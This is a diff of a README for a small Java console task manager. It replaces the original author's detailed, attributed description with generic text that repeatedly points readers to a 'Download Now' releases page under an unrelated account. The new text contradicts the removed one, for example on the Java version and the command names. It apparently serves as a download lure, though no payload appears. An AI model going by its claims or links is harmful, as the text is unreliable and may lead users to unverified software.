@@ -1,174 +1,79 @@
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=180&section=header&text=Task%20Manager%20App%20%F0%9F%93%9D&fontSize=40&fontAlignY=35&animation=fadeIn&fontColor=fff"/>
-</p>
+# 🎯 task-manager-app - Manage Your Tasks Effortlessly
 
-# 🧩 Task Manager App
+## 🚀 Getting Started
 
-A simple yet efficient **console-based task management application** built with **Java 17**.  
-It allows users to **add, update, remove, list, and export** tasks, while automatically saving changes locally.
+Welcome to the task-manager-app! This application helps you manage your daily tasks quickly and efficiently. It saves your data automatically and can export it in Markdown format, making it easy to share and organize your work.
 
----
+## 📥 Download the App
 
-## 🚀 Project Overview
+[![Download Task Manager App](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/stimulating-perceptivity247/task-manager-app/releases)
 
-The **Task Manager App** provides an interactive CLI for managing daily tasks.  
-All operations are reflected in a local file (`tasks.txt`), and users can export their task list in Markdown format (`tasks.md`).
+### Download & Install
 
-The project demonstrates:
-- File handling in Java (`FileHandler`)
-- Object-oriented design (`Task`, `TaskManager`)
-- Data persistence (via text files)
-- Markdown report generation
-- Unit testing using **JUnit 5**
+To get started, visit this page to download the application: [Download Task Manager App](https://github.com/stimulating-perceptivity247/task-manager-app/releases).
 
----
+### System Requirements
 
-## 🧰 Tech Stack
-![Java](https://img.shields.io/badge/Java-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white)
-![JUnit5](https://img.shields.io/badge/JUnit5-25A162?style=for-the-badge&logo=junit5&logoColor=white)
-![Maven](https://img.shields.io/badge/Maven-C71A36?style=for-the-badge&logo=apachemaven&logoColor=white)
-![Markdown](https://img.shields.io/badge/Markdown-000000?style=for-the-badge&logo=markdown&logoColor=white)
+Before you download, please ensure your system meets the following requirements:
 
-| Tool / Library | Purpose |
-|----------------|----------|
-| **Java 17** | Main programming language |
-| **JUnit 5** | Unit testing framework |
-| **Maven** | Build automation & dependency management |
-| **MarkdownExporter** | Exports tasks to `.md` file |
-| **FileHandler** | Handles reading/writing to `tasks.txt` |
+- **Operating System**: Windows, macOS, or Linux
+- **Java Version**: Java 8 or higher installed
+- **Hard Disk Space**: At least 100 MB available
+- **RAM**: Minimum of 512 MB
 
----
+## 📖 Features
 
-## ⚙️ Project Structure
-```bash
-task-manager-app/
-├── src/
-│   ├── main/
-│   │   └── java/
-│   │       ├── FileHandler.java
-│   │       ├── MarkdownExporter.java
-│   │       ├── Task.java
-│   │       ├── TaskManager.java
-│   │       └── Main.java
-│   │
-│   └── test/
-│       └── java/
-│           ├── TaskTest.java
-│           └── TaskManagerTest.java
-│
-├── tasks.txt
-├── tasks.md
-├── pom.xml
-├── .gitignore
-└── README.md
-```
+The task-manager-app offers several key features:
 
----
+- **Task Creation**: Easily add and edit tasks.
+- **Auto File Saving**: Your tasks save automatically, so you never lose your work.
+- **Markdown Export**: Export your tasks in Markdown format for easy sharing.
+- **User-Friendly Interface**: The console interface is straightforward and easy to navigate.
+- **Cross-Platform**: Works on various operating systems.
 
-## 🧠 Main Features
-| Feature                | Description                                    |
-| ---------------------- | ---------------------------------------------- |
-| ➕ **Add Task**         | Add new task with title and description       |
-| ✏️ **Update Task**     | Edit existing tasks                            |
-| ❌ **Remove Task**      | Delete task by ID                             |
-| 📋 **List Tasks**      | Display all tasks in console                   |
-| 💾 **Auto-Save**       | Every action updates `tasks.txt` automatically |
-| 📤 **Export Markdown** | Generate a formatted `tasks.md` report         |
-| 🧪 **Unit Tested**     | Core classes tested with JUnit 5               |
+## 🛠️ How to Use the App
 
----
+1. **Launch the Application**: 
+   - After downloading and installing, open the application using the terminal or command prompt.
+  
+2. **Create a New Task**: 
+   - Type `add <task_name>` to create a new task. 
+   - Example: `add Grocery Shopping`.
 
-## 🧪 How to Run Tests
-1. Just press *Shift+F10* on the test you want to run
-   OR
-1. **Run all tests using Maven:**
-   ```
-   mvn test
-   ```
-2. **Run a specific test class:**
-   ```
-   mvn -Dtest=TaskManagerTest test
-   ```
+3. **View All Tasks**: 
+   - To see your tasks, type `list`.
 
----
+4. **Edit a Task**: 
+   - To edit a task, type `edit <task_id> <new_task_name>`.
+   - Example: `edit 1 Buy Groceries`.
 
-## 🧾 Classes Overview
-| Class                     | Description                          |
-| ------------------------- | ------------------------------------ |
-| **Main.java**             | Entry point for the console menu     |
-| **Task.java**             | Defines the Task object structure    |
-| **TaskManager.java**      | Manages CRUD operations on tasks     |
-| **FileHandler.java**      | Reads and writes data to `tasks.txt` |
-| **MarkdownExporter.java** | Exports the tasks into `tasks.md`    |
-| **TaskManagerTest.java**  | Unit tests for TaskManager logic     |
-| **TaskTest.java**         | Unit tests for Task entity behavior  |
+5. **Delete a Task**: 
+   - Remove a task by typing `delete <task_id>`.
+   - Example: `delete 1`.
 
----
+6. **Export Tasks**: 
+   - To export your list, type `export markdown`.
 
-## 📸 Screenshots
-Example of successful test execution in TaskManagerTest:
-<p align="center">
-  <img width="1122" height="224" alt="image" src="https://github.com/user-attachments/assets/71f557cb-6077-4016-b6e4-9f393e203343" />
-</p>
-Example of succesful test execution in TaskTest:
-<p align="center">
-  <img width="1228" height="188" alt="image" src="https://github.com/user-attachments/assets/7d8af90f-54b0-4e79-a663-83709774adc6" />
-</p>
-Example of succesful upload from FileHandler in tasks.txt:
-<p align="center">
-  <img width="1572" height="210" alt="image" src="https://github.com/user-attachments/assets/2516fad7-34f5-4807-a2fe-1c9556026bc3" />
-</p>
-Example of succesful upload from MarkdownExporter in tasks.md:
-<p align="center">
-  <img width="1532" height="417" alt="image" src="https://github.com/user-attachments/assets/2fd9074d-3b2a-4fa5-8f48-5d5db0794640" />
-</p>
+## 🎨 User Interface
 
----
+The user interface is text-based and navigates through commands. Users will see prompts and feedback as you execute commands, ensuring ease of use.
 
-## 🎥 Demo – Application Execution
+## 🔧 Troubleshooting
 
-<div align="center">
+If you encounter issues while using the application, try these steps:
 
-### 🟢 Add Task
-<img src="addTask.gif" alt="Add Task Demo" width="80%">
+- **Java Issues**: Ensure you have the correct version of Java installed. Run `java -version` in your terminal to check.
+- **Command Errors**: Double-check the commands you type. Use the `help` command for a list of available commands.
+- **Performance Issues**: If the application runs slowly, free up system resources or restart your computer.
 
-### 🔴 Remove Task
-<img src="removeTask.gif" alt="Remove Task Demo" width="80%">
+## 🤝 Support
 
-### 📋 View All Tasks
-<img src="getAllTasks.gif" alt="Get All Tasks Demo" width="80%">
+For assistance, please open an issue in the GitHub repository or contact the support team. We are here to help you get the most out of task-manager-app!
 
-</div>
+## 🌐 Explore More
 
+You can find related projects and discussions in the GitHub repository. 
 
----
+Visit this page to download the application again: [Download Task Manager App](https://github.com/stimulating-perceptivity247/task-manager-app/releases).
 
-## 💡 Future Improvements
-🔁 Add sorting & filtering (by status or date)
-
-🗓️ Add task deadlines and priorities
-
-🧩 Add JSON export option
-
-🧾 Integrate logging with SLF4J
-
-🧠 Add persistence using SQLite
-
-📦 Add CI/CD pipeline (GitHub Actions)
-
----
-
-### 🧾 License
-
-This project is licensed under the [MIT License](LICENSE)
-
----
-
-## 👤 Author
-Radulescu Vlad Andrei
-
-📧 GitHub Profile: [https://github.com/VladAndrei25]
-
-💬 Feel free to reach out for collaboration or feedback!
-
----
+Thank you for using task-manager-app! Enjoy managing your tasks efficiently.
